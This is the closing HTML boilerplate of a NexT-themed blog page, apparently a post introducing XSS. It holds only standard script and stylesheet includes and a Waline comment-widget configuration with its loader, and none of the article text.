crossorigin="anonymous"></script><script src="/en/js/comments.js"></script><script src="/en/js/utils.js"></script><script src="/en/js/motion.js"></script><script src="/en/js/schemes/muse.js"></script><script src="/en/js/next-boot.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script><script src="/en/js/third-party/search/local-search.js"></script><script class="next-config" data-name="enableMath" type="application/json">true</script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.7/katex.min.css" integrity="sha256-hLTCMFlKxdNgPXyWlSSxYN0ykJmxxq9Yt3MNfdRGWeA=" crossorigin="anonymous"><script class="next-config" data-name="waline" type="application/json">{"lang":"zh-cn","enable":true,"serverURL":"https://blog-comments-3w44.vercel.app/","cssUrl":"https://unpkg.com/@waline/client@v2/dist/waline.css","commentCount":true,"pageview":false,"placeholder":"欢迎大家交流学习","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"visitor":true,"comment_count":true,"requiredFields":[],"libUrl":"//unpkg.com/@waline/client@v2/dist/waline.js","el":"#waline","comment":true,"path":"/en/2021/09/05/xss-inrtroduction/"}</script><link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css"><script>
document.addEventListener('page:loaded', () => {
  NexT.utils.loadComments(CONFIG.waline.el).then(() =>
    NexT.utils.getScript(CONFIG.waline.libUrl, { condition: window.Waline })
  ).then(() => 
    Waline.init(Object.assign({}, CONFIG.waline,{ el: document.querySelector(CONFIG.waline.el) }))
  );
});
</script></body></html>